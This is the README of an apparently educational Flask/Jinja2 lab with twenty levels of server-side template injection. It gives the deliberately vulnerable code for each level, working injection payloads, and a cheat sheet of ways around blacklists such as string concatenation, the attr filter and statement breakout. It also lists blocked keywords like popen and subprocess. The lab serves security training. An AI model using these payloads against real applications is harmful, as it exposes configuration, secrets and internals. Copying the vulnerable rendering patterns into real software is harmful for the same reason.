# SSTI (Server-Side Template Injection) Vulnerability Lab

A comprehensive learning environment for practicing Server-Side Template Injection vulnerabilities in Flask/Jinja2 applications.

## Overview

This application contains **20 progressive levels** of SSTI vulnerabilities, each demonstrating different aspects of template injection attacks. The levels range from basic template injection to advanced bypass techniques.

## Setup

```bash
# Run the SSTI vulnerability lab
python3 vuln_ssti.py
```

The application will start on **port 1113**.

Access at: `http://localhost:1113`

---

## Level Descriptions

### Level 1: Variable Renderer
**Difficulty:** Beginner

**Vulnerability:** Basic Jinja2 Template Injection

A simple name rendering system that directly concatenates user input into a Jinja2 template.

**Vulnerable Code:**
```python
template = f"Hello, {user_input}!"
rendered_output = render_template_string(template)
```

**Exploitation:**
- Input: `{{ 7*7 }}` → Output: `Hello, 49!`
- Input: `{{ request.method }}` → Output: `Hello, GET!` (or `POST`)
- Input: `{{ config.items()|length }}` → Output: count of config items
- Input: `{{ ''.__class__.__mro__[1].__subclasses__()|length }}` → Output: number of loaded classes

**Learning Objective:** Understand how template engines process user input and identify basic injection points.

---

### Level 2: Expression Calculator
**Difficulty:** Beginner

**Vulnerability:** Jinja2 Expression Evaluation

A mathematical expression evaluator that uses Jinja2's expression syntax.

**Vulnerable Code:**
```python
template = f"{{{{ {expression} }}}}"
result = render_template_string(template)
```

**Exploitation:**
- Valid: `7 * 6` → `42`
- SSTI: `request.method` → Returns `GET` or `POST`
- SSTI: `config.items()|length` → Returns count of config items
- SSTI: `''.__class__.__mro__[1].__subclasses__()|length` → Returns number of loaded classes

**Learning Objective:** Learn to execute arbitrary Python expressions within template syntax.

---

### Level 3: Config Injector
**Difficulty:** Easy

**Vulnerability:** Flask Config Object Access

Direct access to Flask's application configuration object through template injection.

**Vulnerable Code:**
```python
template = f"Config key: {{{{ config.{config_name} }}}}"
rendered_output = render_template_string(template)
```

**Exploitation:**
- Input: `items()|length` → Returns number of config entries
- Input: `get('DEBUG')` → Returns the debug setting (often `False`)
- Input: `__class__.__mro__` → Returns config class hierarchy
- Input: `__class__.__dict__.keys()` → Lists config class attributes

**Learning Objective:** Recognize configuration exposure risk and verify access safely.

---

### Level 4: Filter Bypass
**Difficulty:** Easy-Medium

**Vulnerability:** Blacklist Bypass on Attribute Access

Template rendering with a basic blacklist filter for common SSTI payloads.

**Blocked Patterns:** `__class__`, `__base__`, `__mro__`, `__subclasses__`, `config`, `self`

**Vulnerable Code:**
```python
blocked_patterns = ['__class__', '__base__', '__mro__', '__subclasses__', 'config', 'self']
if not any(pattern in name for pattern in blocked_patterns):
    template = f"{{{{ {name} }}}}"
```

**Exploitation (Bypass Techniques):**
- Bypass substring filter with concat: `''|attr('__' ~ 'class__')|attr('__' ~ 'mro__')` → MRO output
- Count subclasses: `(''|attr('__' ~ 'class__')|attr('__' ~ 'mro__'))[1]|attr('__' ~ 'sub' ~ 'classes__')()|length` → number of classes
- List subclass names: `(''|attr('__' ~ 'class__')|attr('__' ~ 'mro__'))[1]|attr('__' ~ 'sub' ~ 'classes__')()|map(attribute='__name__')|list` → class names

**Learning Objective:** Learn bypass techniques for basic input filters.

---

### Level 5: Control Injection
**Difficulty:** Medium

**Vulnerability:** Control Structure Injection

User-supplied snippets are inserted directly into a loop body.

**Vulnerable Code:**
```python
template = f"""{{% for item in items %}}{{{{ item }}}} {snippet} {{% endfor %}}"""
rendered_list = render_template_string(template, items=items)
```

**Exploitation:**
- Snippet: `{% if loop.first %}[FIRST]{% endif %}` → Marks the first item
- Snippet: `{% for i in range(3) %}{{ i }}{% endfor %}` → Nested loop injection
- Snippet: `{{ request.path }}` → Leaks request path per item

**Learning Objective:** See how untrusted template fragments enable control-flow injection.

---

### Level 6: Context Hijack
**Difficulty:** Medium

**Vulnerability:** Variable Name Injection / Context Pollution

Dynamic variable rendering that allows accessing unintended context variables.

**Vulnerable Code:**
```python
context = {'user': username, 'time': 'day', 'greeting_type': greeting_type}
template = f"""{{{{ {greeting_type} }}}}"""
output = render_template_string(template, **context)
```

**Exploitation:**
- Input (`type`): `config.items()|length` → Count Flask config entries
- Input (`type`): `request.headers` → Access request headers
- Input (`type`): `url_for.__globals__.keys()` → Access global variables

**Learning Objective:** Learn to pollute template context and access internal objects.

---

### Level 7: Attribute Traversal
**Difficulty:** Medium-Hard

**Vulnerability:** User-Controlled Attribute Path

**Vulnerable Code:**
```python
profile = profile_data.get(profile_id, profile_data['guest'])
template = f"{{{{ profile.{field} }}}}"
field_value = render_template_string(template, profile=profile)
```

**Exploitation:**
- Field: `name` → Normal output
- Field: `keys()` → Lists profile keys
- Field: `__class__.__mro__` → Class hierarchy
- Field: `__class__.__mro__[1].__subclasses__()|length` → Subclass count

**Learning Objective:** Learn how attribute traversal can escape intended fields.

---

### Level 8: Helper Exposure
**Difficulty:** Hard

**Vulnerability:** Dangerous Helper Object in Context

The template exposes a Python function object, which provides access to its globals.

**Blocked Patterns:** `__import__`, `open(`, `eval`, `exec`, `popen`

**Vulnerable Code:**
```python
def helper(msg):
    return f"[{msg}]"

context_vars = {'title': 'Welcome', 'user': 'Guest', 'items': ['a', 'b', 'c'], 'count': 3, 'helper': helper}
rendered_output = render_template_string(template_code, **context_vars)
```

**Exploitation:**
- `{{ helper('ping') }}` → Normal output
- `{{ helper.__globals__ }}` → Dump module globals (includes request/config)
- `{{ helper.__globals__.keys() }}` → List available globals in module context

**Learning Objective:** Learn how exposed callables can leak broader application context.

---

### Level 9: Stored Template
**Difficulty:** Hard

**Vulnerability:** Second-Order SSTI

User input is stored and rendered later as a template.

**Vulnerable Code:**
```python
cur.execute("INSERT INTO templates (label, body) VALUES (?, ?)", (label, body))
...
rendered_output = render_template_string(row['body'], user='Guest', now=timestamp)
```

**Exploitation:**
- Save: `Hello {{ user }} at {{ now }}` → Render later to confirm execution
- Save: `{{ request.path }}` → Render later to leak request path
- Save: `{{ config.items()|length }}` → Render later to count config entries

**Learning Objective:** Identify delayed execution of stored templates.

---

### Level 10: Blacklist Renderer
**Difficulty:** Expert

**Vulnerability:** Naive Blacklist on Template Rendering (SSTI)

Input is rendered as a Jinja template after a simple substring blacklist. A helper context dict is available as `ctx`.

**Blocked Patterns:**
- Double underscores: `__`
- Keywords: `request`, `config`, `session`, `g.`, `url_for`
- Dangerous functions/ops: `import`, `eval`, `exec`, `popen`, `subprocess`, `os.`, `system`, `open(`, `read(`, `write(`
- Numeric characters: `0-9`

**Vulnerable Code:**
```python
ctx = {'request': request, 'config': app.config}
template_str = f"Result: {input_data}"
processed_result = render_template_string(template_str, ctx=ctx)
```

**Exploitation:**
- Input: `{{ ctx['re'~'quest'].method }}` → Bypass `request` keyword block
- Input: `{{ ctx['con'~'fig'].items()|length }}` → Bypass `config` keyword block
 - Input: `{{ ctx['re'~'quest'].headers.get('User-Agent') }}` → Read user agent

**Goal:** Demonstrate SSTI despite the blacklist

**Learning Objective:** Understand why substring blacklists are brittle for template injection.

---

### Level 11: Debug Renderer
**Difficulty:** Beginner

**Vulnerability:** Direct template rendering with sensitive context

**Vulnerable Code:**
```python
rendered_output = render_template_string(template_input, user='Guest', flag=flag)
```

**Exploitation:**
- Input: `{{ flag }}` → Returns the flag value

**Learning Objective:** Confirm unsafe rendering of user-controlled templates.

---

### Level 12: Key Splitter
**Difficulty:** Medium

**Vulnerability:** Keyword block bypass via concatenation

**Blocked Pattern:** `flag`

**Vulnerable Code:**
```python
if 'flag' not in template_input.lower():
    rendered_output = render_template_string(template_input, context=context)
```

**Exploitation:**
- Input: `{{ context['f' ~ 'lag'] }}` → Bypass keyword filter

**Learning Objective:** Use string concatenation to evade keyword blacklists.

---

### Level 13: Dotless Vault
**Difficulty:** Medium

**Vulnerability:** Attribute access despite dot removal

**Filter:** Removes `.` characters

**Exploitation:**
- Input: `{{ vault|attr('flag') }}` → Access attribute without dot

**Learning Objective:** Leverage Jinja filters to bypass operator restrictions.

---

### Level 14: Bracketless Getter
**Difficulty:** Medium

**Vulnerability:** Dict access via method call

**Filters:** Blocks `flag` keyword and removes `[` `]`

**Exploitation:**
- Input: `{{ data.get('f' ~ 'lag') }}` → Access key without brackets

**Learning Objective:** Use method calls to bypass bracket filtering.

---

### Level 15: Double Render
**Difficulty:** Hard

**Vulnerability:** Two-pass rendering

**Vulnerable Code:**
```python
stage_one = render_template_string(template_input)
rendered_output = render_template_string(stage_one, flag=flag)
```

**Exploitation:**
- Input: `{{ '{{ flag }}' }}` → Deferred execution on second pass

**Learning Objective:** Recognize and exploit double-render patterns.

---

### Level 16: Macro Lab
**Difficulty:** Hard

**Vulnerability:** User-controlled macro body

**Vulnerable Code:**
```python
template = "{% macro report(user) %}" + macro_body + "{% endmacro %}{{ report('guest') }}"
```

**Exploitation:**
- Input: `{{ flag }}` → Macro executes injected template code

**Learning Objective:** Exploit injection points inside macro definitions.

---

### Level 17: Statement Breakout
**Difficulty:** Hard

**Vulnerability:** Template statement injection

**Vulnerable Code:**
```python
template = "{% set msg = '" + msg + "' %}Message: {{ msg }}"
```

**Exploitation:**
- Input: `x' %}{{ flag }}{% set msg = 'y` → Break out of string and keep template valid

**Learning Objective:** Understand statement breakout payloads.

---

### Level 18: Index Escape
**Difficulty:** Hard

**Vulnerability:** Digit filter bypass

**Filter:** Blocks numeric characters

**Exploitation:**
- Input: `{{ flags['a'|length] }}` → Uses length to generate index

**Learning Objective:** Bypass digit filters with computed values.

---

### Level 19: Attribute Mapper
**Difficulty:** Expert

**Vulnerability:** Attribute mapping without direct access

**Filters:** Blocks `flag` keyword and removes dots

**Exploitation:**
- Input: `{{ users|map(attribute=('f' ~ 'lag'))|list }}` → Map attribute across list

**Learning Objective:** Use higher-order filters to access protected fields.

---

### Level 20: Chain Bypass
**Difficulty:** Expert

**Vulnerability:** Chained filter bypass

**Filters:** Blocks `flag`, `.`, `[`, `]`

**Exploitation:**
- Input: `{{ store|attr('get')('f' ~ 'lag') }}` → Chain filters and concat

**Learning Objective:** Combine multiple bypass techniques in a restricted context.

---

## SSTI Validation Cheat Sheet

### Basic Jinja2 Syntax
```
{{ variable }}           # Variable output
{% if %}...{% endif %}   # Conditional
{% for %}...{% endfor %} # Loop
{{ 7*7 }}               # Expression (49)
{{ 'string' }}          # String literal
```

### Common Verification Chains

#### 1. Access Configuration
```jinja2
{{ config.items()|length }}
{{ config.get('DEBUG') }}
```

#### 2. Access Python Builtins
```jinja2
{{ ''.__class__ }}
{{ ''.__class__.__base__ }}
{{ ''.__class__.__base__.__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

#### 3. List Subclasses (Debug Only)
```jinja2
{{ ''.__class__.__base__.__subclasses__() | map(attribute='__name__') | list }}
```
Note: subclass indexes vary by Python version. Pick the class you need from the list above.

#### 4. Request Context (Low Risk)
```jinja2
{{ request.method }}
{{ request.path }}
{{ request.headers.get('User-Agent') }}
```

#### 5. Second-Order Example
```jinja2
# Store this, then render it later
Hello {{ user }} at {{ now }}
```

### Filter Bypass Techniques

#### Attribute Access Bypass
```
# Instead of: object.attribute
object|attr('attribute')
object['__class__']
object['attribute']
```

#### String Concatenation Bypass
```
# Instead of: '__class__'
'__cl' 'ass__'
'__c' 'las' 's__'
{% set x='__' %}{{ x+'class__' }}
ctx['re'~'quest']
```

#### Encoding Bypass
```
# Use Unicode escapes
# Use URL encoding in requests
# Use hex encoding
```

## Port Information

- **SSTI Lab:** Port 1113
- **SQLi Lab:** Port 1111
- **XSS Lab:** Port 1112

## Safety Notes

This application is intended for **educational purposes only**. It demonstrates real vulnerabilities that should be avoided in production applications. Key security lessons:

1. **Never** render user input directly in templates without proper sanitization
2. **Always** use strict allow-lists for template variables
3. **Avoid** `render_template_string()` with user input
4. **Use** template engines with sandboxing when possible
5. **Implement** proper input validation and output encoding

## References

- [PortSwigger: Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks: SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [Jinja2 Documentation](https://jinja.palletsprojects.com/)

---

**© sondt (Administrator) // All Rights Reserved**


  20 SSTI Levels Overview

  | Level | Name                  | Vulnerability Type               |
  |-------|-----------------------|----------------------------------|
  | 1     | Variable Renderer     | Basic Jinja2 Template Injection  |
  | 2     | Expression Calculator | Expression Evaluation            |
  | 3     | Config Injector       | Config Object Access             |
  | 4     | Filter Bypass         | Blacklist Bypass                 |
  | 5     | Control Injection     | Control Structure Injection      |
  | 6     | Context Hijack        | Variable Name Injection          |
  | 7     | Attribute Traversal   | Attribute Path Injection         |
  | 8     | Helper Exposure       | Context Helper Leak              |
  | 9     | Stored Template       | Second-Order SSTI                |
  | 10    | Blacklist Renderer    | Blacklist Filter SSTI            |
  | 11    | Debug Renderer        | Direct Template Rendering        |
  | 12    | Key Splitter          | Keyword Filter Bypass            |
  | 13    | Dotless Vault         | Attribute Filter Bypass          |
  | 14    | Bracketless Getter    | Dict Getter Bypass               |
  | 15    | Double Render         | Two-Pass Rendering               |
  | 16    | Macro Lab             | Macro Injection                  |
  | 17    | Statement Breakout    | Template Statement Injection     |
  | 18    | Index Escape          | Digit Filter Bypass              |
  | 19    | Attribute Mapper      | Attribute Mapping                |
  | 20    | Chain Bypass          | Chained Filter Bypass            |
